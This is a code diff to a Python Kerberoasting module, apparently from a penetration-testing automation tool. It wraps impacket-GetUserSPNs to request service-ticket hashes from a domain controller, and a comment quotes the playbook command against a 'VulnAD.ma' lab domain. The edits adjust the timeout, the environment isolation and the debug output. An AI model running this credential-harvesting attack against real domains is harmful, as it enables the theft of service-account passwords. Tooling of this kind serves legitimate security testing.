@@ -151,7 +151,8 @@ class KerberoastingModule:
     """
 
     def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
-        self.executor = executor or CommandExecutor(verbose=False, default_timeout=180)
+        # 600s: GetUserSPNs -request can be slow on large domains
+        self.executor = executor or CommandExecutor(verbose=False, default_timeout=600)
 
     # ------------------------------------------------------------------ #
     #  Public API                                                          #
@@ -192,7 +193,8 @@ class KerberoastingModule:
         warnings: list[str] = []
 
         # ── Build credential string ─────────────────────────────────────
-        # Format: domain/username:password or domain/username -hashes :NThash
+        # Playbook command:
+        #   impacket-GetUserSPNs VulnAD.ma/username:password -dc-ip <IP> -request
         if creds.ntlm_hash:
             nt = creds.ntlm_hash.split(":")[-1] if ":" in creds.ntlm_hash else creds.ntlm_hash
             auth_args = [
@@ -202,8 +204,7 @@ class KerberoastingModule:
         else:
             auth_args = [f"{domain}/{creds.username}:{creds.password}"]
 
-        # ── Run GetUserSPNs with -request to extract hashes ────────────
-        # Mirrors playbook: impacket-GetUserSPNs VulnAD.ma/ -u user -p pass -request
+        # ── Build command ───────────────────────────────────────────────
         command = [
             binary,
             *auth_args,
@@ -211,8 +212,39 @@ class KerberoastingModule:
             "-request",
         ]
 
-        result   = self.executor.run(command)
+        from rich.console import Console as _RCon
+        _RCon().print(
+            f"  [dim]Command: {binary} {domain}/{creds.username}:<pass> "
+            f"-dc-ip {target} -request[/dim]"
+        )
+
+        # ── Clean environment (venv isolation fix) ──────────────────────
+        # Same fix as AS-REP: impacket is a system binary that needs system
+        # Python's site-packages (pyasn1 etc).  Strip venv env vars so the
+        # subprocess uses system Python, not the venv interpreter.
+        import os as _os
+        clean_env = dict(_os.environ)
+        for _var in ("VIRTUAL_ENV", "PYTHONHOME", "PYTHONPATH"):
+            clean_env.pop(_var, None)
+        venv_bin = _os.path.join(_os.environ.get("VIRTUAL_ENV", ""), "bin")
+        orig_path = clean_env.get("PATH", "")
+        clean_env["PATH"] = ":".join(p for p in orig_path.split(":") if p != venv_bin)
+
+        result   = self.executor.run(command, ok_exit_codes=(0, 1), env=clean_env)
         combined = result["output"] + "\n" + result["error"]
+
+        # ── Debug output ────────────────────────────────────────────────
+        from rich.console import Console as _RCon2
+        if not combined.strip():
+            _RCon2().print("  [bold red]WARNING: impacket returned empty output.[/bold red]")
+        elif "traceback" in combined.lower():
+            _RCon2().print(f"  [bold red]impacket CRASH ({len(combined)} chars):[/bold red]")
+            for line in combined.strip().splitlines()[:20]:
+                _RCon2().print(f"  [red]{line}[/red]")
+        else:
+            first = combined.strip().splitlines()[0]
+            _RCon2().print(f"  [dim]impacket output ({len(combined)} chars): {first[:120]}[/dim]")
+
 
         # ── Parse results ───────────────────────────────────────────────
         tgs_entries = _parse_tgs_hashes(combined)
